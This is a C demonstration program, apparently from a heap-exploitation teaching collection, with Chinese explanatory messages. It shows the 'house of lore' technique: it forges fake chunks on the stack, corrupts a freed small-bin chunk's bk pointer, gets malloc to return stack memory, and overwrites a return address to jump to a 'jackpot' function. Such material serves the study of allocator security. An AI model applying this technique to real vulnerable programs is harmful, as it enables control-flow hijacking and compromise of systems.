#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }

int main(int argc, char * argv[]){

  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};
  fprintf(stderr, "定义了两个数组");
  fprintf(stderr, "stack_buffer_1 在 %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 在 %p\n", (void*)stack_buffer_2);

  intptr_t *victim = malloc(100);
  fprintf(stderr, "申请第一块属于 fastbin 的 chunk 在 %p\n", victim);
  intptr_t *victim_chunk = victim-2;//chunk 开始的位置

  fprintf(stderr, "在栈上伪造一块 fake chunk\n");
  fprintf(stderr, "设置 fd 指针指向 victim chunk，来绕过 small bin 的检查，这样的话就能把堆栈地址放在到 small bin 的列表上\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 来绕过最后一个 malloc 中 small bin corrupted, 返回指向栈上假块的指针");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;

  void *p5 = malloc(1000);
  fprintf(stderr, "另外再分配一块，避免与 top chunk 合并 %p\n", p5);

  fprintf(stderr, "Free victim chunk %p, 他会被插入到 fastbin 中\n", victim);
  free((void*)victim);

  fprintf(stderr, "\n此时 victim chunk 的 fd、bk 为零\n");
  fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "这时候去申请一个 chunk，触发 fastbin 的合并使得 victim 进去 unsortedbin 中处理，最终被整理到 small bin 中 %p\n", victim);
  void *p2 = malloc(1200);

  fprintf(stderr, "现在 victim chunk 的 fd 和 bk 更新为 unsorted bin 的地址\n");
  fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "现在模拟一个可以覆盖 victim 的 bk 指针的漏洞，让他的 bk 指针指向栈上\n");
  victim[1] = (intptr_t)stack_buffer_1;

  fprintf(stderr, "然后申请跟第一个 chunk 大小一样的 chunk\n");
  fprintf(stderr, "他应该会返回 victim chunk 并且它的 bk 为修改掉的 victim 的 bk\n");
  void *p3 = malloc(100);

  fprintf(stderr, "最后 malloc 一次会返回 victim->bk 指向的那里\n");
  char *p4 = malloc(100);
  fprintf(stderr, "p4 = malloc(100)\n");

  fprintf(stderr, "\n在最后一个 malloc 之后，stack_buffer_2 的 fd 指针已更改 %p\n",stack_buffer_2[2]);

  fprintf(stderr, "\np4 在栈上 %p\n", p4);
  intptr_t sc = (intptr_t)jackpot;
  memcpy((p4+40), &sc, 8);
}